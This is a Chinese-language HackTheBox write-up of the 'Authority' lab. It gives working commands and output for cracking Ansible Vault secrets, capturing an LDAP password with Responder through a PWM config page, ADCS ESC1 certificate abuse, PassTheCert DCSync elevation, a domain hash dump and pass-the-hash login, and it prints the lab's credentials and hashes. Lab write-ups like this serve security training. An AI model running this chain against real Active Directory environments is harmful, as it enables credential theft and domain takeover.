---
title: "HTB Authority"
description: "HackTheBox篇ADCS系列之Authority"

date: 2025-03-20T12:51:09+08:00
lastmod: 2025-11-11T15:05:42+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - ADCS-ESC1
  - PassTheCert
---
<!--more-->

> 靶机ip：10.10.11.222

# 知识点

* ADCS枚举
* ESC1提权
* PassTheCert

# 信息收集

```shell
./rustscan -a 10.10.11.222 -u 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.222:53
Open 10.10.11.222:80
Open 10.10.11.222:88
Open 10.10.11.222:135
Open 10.10.11.222:139
Open 10.10.11.222:389
Open 10.10.11.222:445
Open 10.10.11.222:464
Open 10.10.11.222:593
Open 10.10.11.222:636
Open 10.10.11.222:3268
Open 10.10.11.222:3269
Open 10.10.11.222:5985
Open 10.10.11.222:8443
Open 10.10.11.222:9389
Open 10.10.11.222:47001
Open 10.10.11.222:49664
Open 10.10.11.222:49665
Open 10.10.11.222:49666
Open 10.10.11.222:49667
Open 10.10.11.222:49673
Open 10.10.11.222:49690
Open 10.10.11.222:49691
Open 10.10.11.222:49693
Open 10.10.11.222:49694
Open 10.10.11.222:49703
Open 10.10.11.222:49715
Open 10.10.11.222:65418
Open 10.10.11.222:65467
```

# HTTP服务

80端口是个正常的IIS页面

![image-20250320182702632](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320182705578-1966780528.png)

注意到有个8443特别的端口，尝试访问一下

![image-20250320161911292](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320161926717-387925342.png)

发现是pwm登陆页面，没有准确的用户名密码

# SMB信息收集

```shell
smbclient -L //10.10.11.222
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk
        Development     Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

发现有`Development`可以匿名访问

可以找到关键的`/Automation/Ansible/PWM/defaults/main.yml` 文件，同时可以发现有ADCS服务

![image-20250320182434726](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320182437854-1899444192.png)

找到pwm加密的密码

通过问Deepseek得知，这是通过`Ansible Vault`加密的数据，可以使用 `ansible2john` 将该哈希转为可以被爆破的形式，并且通过哈希爆破得到密钥，使用得到的密钥即可解密数据得到用户的明文密码

```shell
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
```

将上面hash分别保存至文件`pwm_admin_login_hash`、`pwm_admin_password_hash`、`ldap_admin_password_hash`中

使用 `ansible2john` 转换成可以爆破的形式

```
ansible2john pwm_admin_login_hash > pwm_admin_login_hash.txt
ansible2john pwm_admin_password_hash > pwm_admin_password_hash.txt
ansible2john ldap_admin_password_hash > ldap_admin_password_hash.txt
```

使用`john`爆破密钥

```shell
john pwm_admin_login_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john pwm_admin_password_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john ldap_admin_password_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20250320185235015](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185237658-1520004310.png)

![image-20250320185244551](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185246651-942398066.png)

![image-20250320185408004](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185409986-1298106594.png)

发现密钥都是相同的，都是`!@#$%^&*`

最后使用`ansible-vault`解密

```shell
ansible-vault decrypt pwm_admin_login_hash
ansible-vault decrypt pwm_admin_password_hash
ansible-vault decrypt ldap_admin_password_hash
```

查看一下结果

![image-20250320185811710](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320185813914-460862144.png)

发现对应的密码

```info
pwm_admin_login_hash   			svc_pwm
pwm_admin_password_hash   		pWm_@dm!N_!23
ldap_admin_password_hash		DevT3st@123
```

# 利用LDAP捕获密码

拿到密码`pWm_@dm!N_!23`后，查看8443的PWM服务，点击`Configuration Editor`，输入密码成功登录

我们在配置页面中，找到一处可以发起 LDAP 认证的功能。我们在此处新建一个URL，地址为攻击机`responder`的地址。然后我们开启攻击机的`responder`，再点击网页上的`Test LDAP Profile`。就可以捕获到受害机向攻击机发起的LDAP认证数据。

**注：此处LDAP使用389端口，是因为389端口是明文流量，认证信息会被明文传输。**

![image-20250320190551551](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320190553448-208337479.png)

```shell
[+] Listening for events...

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

得到`svc_ldap` 用户的密码

```info
username: svc_ldap
password: lDaP_1n_th3_cle4r!
```

使用`netexec`工具进一步枚举

![image-20250320190851336](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320190853766-781346724.png)

发现可以登录，使用`evil-winrm`登录

![image-20250320191021244](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320191024470-924325067.png)

登陆成功，在`Desktop`找到`user.txt`

# ESC1提权

由于之前发现到存在ADCS服务，并且通过信息收集后发现只存在`svc_ldap`低权用户，使用`netexec `尝试在域中枚举ADCS

```shell
netexec ldap 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M adcs
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
ADCS        10.10.11.222    389    AUTHORITY        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.222    389    AUTHORITY        Found PKI Enrollment Server: authority.authority.htb
ADCS        10.10.11.222    389    AUTHORITY        Found CN: AUTHORITY-CA
```

发现CA证书，使用`certipy-ad`寻找利用点

```shell
certipy-ad find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

发现可以进行`ECS1`攻击，但是注意到

```info
Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                  AUTHORITY.HTB\Domain Admins
                                  AUTHORITY.HTB\Enterprise Admins
```

我们是`Domain Computers`并不是`Domain Users`，并且只是一个普通的域用户

但是我们可以创建一个计算机账户（域用户通常都会具有创建计算机账户的权限）

```shell
impacket-addcomputer 'authority.htb'/'svc_ldap':'lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'ya1orin$' -computer-pass 'Aa123456!' -dc-ip 10.10.11.222
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account ya1orin$ with password Aa123456!.
```

添加成功，继续使用ECS1提权

```shell
certipy-ad req -u 'ya1orin$' -p 'Aa123456!' -ca 'AUTHORITY-CA' -dc-ip 10.10.11.222 -template 'CorpVPN ' -upn 'Administrator' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 3
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

先同步一下时间

```shell
ntpdate -s authority.htb
```

继续攻击

```shell
certipy-ad auth -pfx administrator.pfx -username Administrator -domain authority.htb -dc-ip 10.10.11.222 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

注意到有个`KDC_ERR_PADATA_TYPE_NOSUPP`报错

> 参考链接：https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d

查阅资料后得知，当域控制器没有为智能卡安装证书时会发生这种情况。具体来说，这是因为 DC 没有正确设置 PKINIT，认证将会失败。

我们得到的证书就没办法获取到hash了

文章中也提到过解决方案

![image-20250320201747004](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320201749751-1573262318.png)

可以使用`PassTheCert`攻击

# PassTheCert

利用场景：

* 授予指定用户DCSync权限，需要证书具有对域的 `WriteDacl` 权限

* 修改机器账户的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性以进行 `RBCD` 攻击

* 添加一个机器账户

* 修改指定账户的密码，需要证书具有对指定账户的 `User-Force-Change-Password` 权限

由于我们已经生成了具有 Administrator账户权限的证书。我们可以使用第一种攻击，也就是给指定用户添加DCSync权限。

`PassTheCert` 使用的认证机制涉及证书的私钥和公钥，这些密钥存储在 `.pfx` 文件中。

可以使用 `certipy` 提取私钥和公钥文件：

```shell
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'administrator.key'

certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'administrator.crt'
```

使用 `passthecert` 攻击，给创建的机器账户添加 `DCSync` 权限

```shell
python3 PassTheCert/Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action modify_user -target svc_ldap -elevate
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Granted user 'svc_ldap' DCSYNC rights!
```

使用DCSync攻击获取所有域用户的哈希

```shell
impacket-secretsdump 'authority.htb'/'svc_ldap':'lDaP_1n_th3_cle4r!'@10.10.11.222
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:b575dfe6416d270616f91c393c18e61c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:5e2e6bc11785004bb7cdb803d6e877cf7badaa9b653a6b29ee42abeec5a3c527
AUTHORITY$:aes128-cts-hmac-sha1-96:e2d4b00747cf4f3e1b3765f1b2b38f36
AUTHORITY$:des-cbc-md5:94f83246687c456e
[*] Cleaning up...
```

拿到`Administrator`的`hash`，使用`netexec`检验一下

```shell
netexec winrm 10.10.11.222 -u administrator -H aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\administrator:6961f422924da90a6928197429eea4ed (Pwn3d!)
```

使用`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.222 -u administrator -H 6961f422924da90a6928197429eea4ed

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

登陆成功，在`Desktop`找到`root.txt`